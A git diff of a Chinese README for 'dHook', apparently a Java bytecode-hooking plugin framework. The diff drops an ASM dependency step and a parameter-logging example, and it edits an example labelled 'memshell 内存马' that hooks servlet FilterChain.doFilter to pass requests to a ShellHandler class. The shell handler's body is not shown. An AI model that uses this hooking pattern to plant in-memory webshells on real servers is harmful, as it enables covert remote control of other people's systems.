@@ -3,15 +3,7 @@
 1. 创建一个新的java project，并命名为**dHook**.
 2. 下载[dHook.zip](./dHook.zip)
 3. 解压dHook.zip，放入你的插件项目中.
-4. 导入asm依赖
-```xml
-<dependency>
-     <groupId>org.ow2.asm</groupId>
-     <artifactId>asm-commons</artifactId>
-     <version>7.0</version>
-</dependency>
-```
-5. 如下编写名为`DHookExtender`的类实现IDHookExtender接口,实现对应的方法.
+4. 如下编写名为`DHookExtender`的类实现IDHookExtender接口,实现对应的方法.
 ```java
 package dHook;
 public class DHookExtender implements IDHookExtender {
@@ -59,55 +51,12 @@ public class DHookExtender implements IDHookExtender {
 
 ## 案例
 
-### 打印应用中部分用户输入的参数：
-```java
-package dHook;
-
-
-import org.objectweb.asm.Type;
-import org.objectweb.asm.commons.AdviceAdapter;
-import org.objectweb.asm.commons.Method;
-import java.util.ArrayList;
-
-
-public class DHookExtender implements IDHookExtender, ISource {
-    private IDHookExtenderCallbacks callbacks; //将IDHookExtenderCallbacks对象设置为属性，供修改方法时使用
-
-    public void registerExtenderCallbacks(IDHookExtenderCallbacks callbacks) {
-        ArrayList<String> list = new ArrayList<>();
-        list.add("org/apache/catalina/connector/Request.getParameter(Ljava/lang/String;)Ljava/lang/String;");
-        callbacks.setExtensionHooks(list); //设置hook点
-        callbacks.setExtensionName("request");//设置插件名
-        callbacks.setExtensionDesc("打印请求参数");//设置插件描述
-        this.callbacks = callbacks; //绑定属性
-    }
-
-    public void onMethodExit(int opcode) {
-
-        callbacks.pushReturnValue(adviceAdapter, opcode, callbacks.getHookDesc()); //将getParameter方法返回值押入栈中
-        Type type = Type.getType(HookHandler.class);
-        Method method = new Method("doHook", "(Ljava/lang/Object;[Ljava/lang/Object;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V");
-        callbacks.pushParameter(adviceAdapter); //将getParameter方法参数押入栈中
-        callbacks.pushObject(adviceAdapter, callbacks.getHookClassName()); //将当前hook的className押入栈中
-        callbacks.pushObject(adviceAdapter, callbacks.getHookMethod());//将当前hook的method押入栈中
-        callbacks.pushObject(adviceAdapter, callbacks.getHookDesc());//将当前hook的desc押入栈中
-        callbacks.invokeStatic(adviceAdapter, type, method); //调用doHook静态方法，传入的参数为押入栈中的对象
-    }
-
-    public void onMethodEnter() {
-    }
-
-    @Override
-    public void onVisitCode() {
-
-    }
-}
-```
-### memshell
+### memshell 内存马
 ```java
 public class DHookExtender implements IDHookExtender {
+
     private IDHookExtenderCallbacks callbacks;
-    @Override
+
     public void registerExtenderCallbacks(IDHookExtenderCallbacks callbacks) {
         ArrayList<String> list = new ArrayList<>();
         list.add("javax/servlet/FilterChain.doFilter(Ljavax/servlet/ServletRequest;Ljavax/servlet/ServletResponse;)V");
@@ -117,15 +66,9 @@ public class DHookExtender implements IDHookExtender {
         this.callbacks = callbacks;
     }
 
-    @Override
-    public void onMethodExit(int opcode) {
+    public void onMethodExit(int opcode) {}
 
-
-    }
-    @Override
     public void onMethodEnter() {
-        Type type = Type.getType(HookHandler.class);
-        Method method = new Method("doHook", "([Ljava/lang/Object;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V");
         //将当前参数（此处为request和response）加入调用栈
         callbacks.pushParameter();
         //将当前hook className加入调用栈
@@ -135,16 +78,11 @@ public class DHookExtender implements IDHookExtender {
         //将当前hook desc加入调用栈
         callbacks.pushObject(callbacks.getHookDesc());
         //调用静态方法
-        callbacks.invokeStatic(type, method);
-    }
-
-    @Override
-    public void onVisitCode() {
-
+        this.callbacks.invokeStatic(ShellHandler.class, "doHook", "([Ljava/lang/Object;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V");
     }
 }
 
-public class HookHandler {
+public class ShellHandler {
     protected static final Class[] EMPTY_CLASS = new Class[]{};
     protected static final Class[] STRING_CLASS = new Class[]{String.class};
     private static final ThreadLocal<Boolean> longThreadLocal = new ThreadLocal<>();
